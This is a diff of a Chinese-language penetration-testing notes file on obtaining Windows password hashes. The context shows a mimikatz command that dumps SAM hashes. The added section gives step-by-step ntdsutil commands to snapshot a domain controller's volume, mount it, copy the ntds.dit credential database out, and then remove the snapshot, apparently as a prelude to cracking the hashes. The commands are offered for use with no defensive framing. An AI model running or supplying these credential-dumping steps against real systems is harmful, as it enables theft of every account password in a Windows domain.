@@ -30,9 +30,29 @@ $ ./mimikatz.exe
 mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
 ```
 
-### 3. 破解Hash获取明文密码
- 
- 见0x03 破解 Hash 
+### 3. 导出域Hash ntds,dit
+``
+ 创建快照
+ntdsutil snapshot "activate instance ntds" create quit quit
+GUID 为 {aa488f5b-40c7-4044-b24f-16fd041a6de2}
+
+# 挂载快照
+ntdsutil snapshot "mount GUID" quit quit
+
+# 复制 ntds.dit
+copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
+
+# 卸载快照
+ntdsutil snapshot "unmount GUID" quit quit
+
+# 删除快照
+ntdsutil snapshot "delete GUID" quit quit
+
+# 查询快照
+ntdsutil snapshot "List All" quit quit
+ntdsutil snapshot "List Mounted" quit quit
+ ```
+### 
 ## 0x02 主机获取Hash
 
 ## 0x03 破解 Hash 
